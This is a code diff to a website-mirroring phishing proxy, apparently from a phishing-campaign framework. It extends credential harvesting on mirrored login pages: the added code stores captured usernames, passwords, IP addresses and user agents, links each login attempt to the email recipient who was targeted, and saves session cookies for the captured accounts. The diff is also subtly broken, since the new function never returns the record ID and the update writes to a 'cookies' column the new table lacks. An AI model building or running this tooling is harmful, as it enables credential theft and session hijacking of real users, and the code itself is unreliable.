@@ -474,10 +474,14 @@ class WebsiteMirroringService {
       
       // Extract and log form data
       const formData = { ...req.body };
+      const trackingId = req.query._fstrike_track || formData._fstrike_track;
       delete formData._fstrike_session; // Remove our tracking field
+      delete formData._fstrike_track;   // Remove our tracking field
       
       // Check for potential credentials
       const credentialFields = this.extractCredentials(formData);
+      let loginAttemptId = null;
+      
       if (credentialFields && Object.keys(credentialFields).length > 0) {
         console.log('🔑 POSSIBLE CREDENTIALS DETECTED:', JSON.stringify(credentialFields));
         
@@ -487,29 +491,52 @@ class WebsiteMirroringService {
           ...credentialFields,
           timestamp: new Date().toISOString(),
           url: targetUrl,
-          ip: req.ip
+          ip: req.ip,
+          userAgent: req.get('User-Agent')
         });
         this.captures.set(session.sessionToken, captures);
         
-        // Store in database for long-term
+        // Store in database and associate with email recipient if possible
         try {
-          db.run(
-            `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent)
-             VALUES (?, ?, ?, ?, ?, ?, ?)`,
-            [
-              session.campaignId, 
-              targetUrl, 
-              credentialFields.username || credentialFields.email || null, 
-              credentialFields.password || null,
-              JSON.stringify(formData),
-              req.ip, 
-              req.get('User-Agent')
-            ],
-            function(err) {
-              if (err) console.error('Error storing credentials:', err);
-              else console.log('💾 Credentials stored in database with ID:', this.lastID);
+          // First store in captured_credentials table
+          await new Promise((resolve, reject) => {
+            db.run(
+              `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent)
+               VALUES (?, ?, ?, ?, ?, ?, ?)`,
+              [
+                session.campaignId, 
+                targetUrl, 
+                credentialFields.username || credentialFields.email || null, 
+                credentialFields.password || null,
+                JSON.stringify(formData),
+                req.ip, 
+                req.get('User-Agent')
+              ],
+              function(err) {
+                if (err) {
+                  console.error('Error storing credentials:', err);
+                  reject(err);
+                } else {
+                  console.log('💾 Credentials stored in database with ID:', this.lastID);
+                  resolve(this.lastID);
+                }
+              }
+            );
+          });
+          
+          // Now associate with email recipient
+          loginAttemptId = await this.associateLoginWithEmail(
+            session.sessionToken, 
+            trackingId, 
+            {
+              ...credentialFields,
+              formData: JSON.stringify(formData),
+              ip_address: req.ip,
+              user_agent: req.get('User-Agent')
             }
           );
+          
+          console.log('Login attempt associated with email, ID:', loginAttemptId);
         } catch (dbError) {
           console.error('Database error when storing credentials:', dbError);
         }
@@ -583,6 +610,11 @@ class WebsiteMirroringService {
         
         // Track interesting cookies (like auth tokens)
         this.trackInterestingCookies(session.sessionToken, cookies);
+        
+        // If we have a login attempt ID, update it with cookies
+        if (loginAttemptId) {
+          await this.updateCookiesForLogin(loginAttemptId, session.sessionToken);
+        }
       }
 
       // Handle redirects
@@ -619,9 +651,6 @@ class WebsiteMirroringService {
     }
   }
 
-  /**
-   * Extract potential credentials from form data
-   */
   extractCredentials(formData) {
     const result = {};
     const credentialFields = {
@@ -654,7 +683,123 @@ class WebsiteMirroringService {
   }
 
   /**
-   * Handle proxy errors gracefully
+   * Associate login attempt with target email (the user who received the phishing email)
+   * @param {string} sessionToken - The session token
+   * @param {string} trackingId - The tracking ID associated with the email recipient
+   * @param {object} credentials - The captured credentials
+   */
+  async associateLoginWithEmail(sessionToken, trackingId, credentials) {
+    try {
+      // First, check if we can identify the target email from the tracking ID
+      if (!trackingId) return;
+      
+      const emailInfo = await new Promise((resolve, reject) => {
+        db.get(
+          `SELECT user_email, campaign_id FROM tracking_pixels WHERE id = ?`,
+          [trackingId],
+          (err, row) => {
+            if (err) reject(err);
+            else resolve(row);
+          }
+        );
+      });
+      
+      if (!emailInfo) return;
+      
+      // Create login_attempts table if it doesn't exist
+      await new Promise((resolve, reject) => {
+        db.run(`
+          CREATE TABLE IF NOT EXISTS login_attempts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            campaign_id INTEGER NOT NULL,
+            session_id TEXT NOT NULL, 
+            target_email TEXT NOT NULL,
+            username TEXT,
+            password TEXT,
+            input_email TEXT,
+            form_data TEXT,
+            url TEXT,
+            ip_address TEXT,
+            user_agent TEXT,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+            has_cookies INTEGER DEFAULT 0
+          )
+        `, (err) => {
+          if (err) reject(err);
+          else resolve();
+        });
+      });
+      
+      // Store the login attempt with the association to the target email
+      const session = this.activeSessions.get(sessionToken);
+      
+      if (session) {
+        await new Promise((resolve, reject) => {
+          db.run(`
+            INSERT INTO login_attempts (
+              campaign_id, session_id, target_email, username, password, input_email, 
+              form_data, url, ip_address, user_agent
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+          `, [
+            emailInfo.campaign_id,
+            session.sessionId,
+            emailInfo.user_email,
+            credentials.username || null,
+            credentials.password || null,
+            credentials.email || null,
+            JSON.stringify(credentials),
+            session.targetUrl,
+            null,  // IP address will be added on request
+            null   // User agent will be added on request
+          ], function(err) {
+            if (err) reject(err);
+            else {
+              console.log(`Login attempt associated with email: ${emailInfo.user_email}, ID: ${this.lastID}`);
+              resolve(this.lastID);
+            }
+          });
+        });
+      }
+    } catch (error) {
+      console.error('Error associating login with email:', error);
+    }
+  }
+  
+  /**
+   * Update cookies for a login attempt
+   * @param {number} loginAttemptId - The login attempt ID
+   * @param {string} sessionToken - The session token
+   */
+  async updateCookiesForLogin(loginAttemptId, sessionToken) {
+    try {
+      if (!loginAttemptId || !sessionToken) return;
+      
+      const captures = this.captures.get(sessionToken);
+      if (!captures || !captures.cookies || captures.cookies.length === 0) return;
+      
+      // Store cookies in database
+      const cookiesJson = JSON.stringify(captures.cookies);
+      
+      await new Promise((resolve, reject) => {
+        db.run(`
+          UPDATE login_attempts 
+          SET cookies = ?, has_cookies = 1
+          WHERE id = ?
+        `, [cookiesJson, loginAttemptId], (err) => {
+          if (err) reject(err);
+          else {
+            console.log(`Updated cookies for login attempt: ${loginAttemptId}`);
+            resolve();
+          }
+        });
+      });
+    } catch (error) {
+      console.error('Error updating cookies for login:', error);
+    }
+  }
+
+  /**
+   * Handle proxy error gracefully
    */
   handleProxyError(error, res, session) {
     console.error('Proxy error:', error.message);
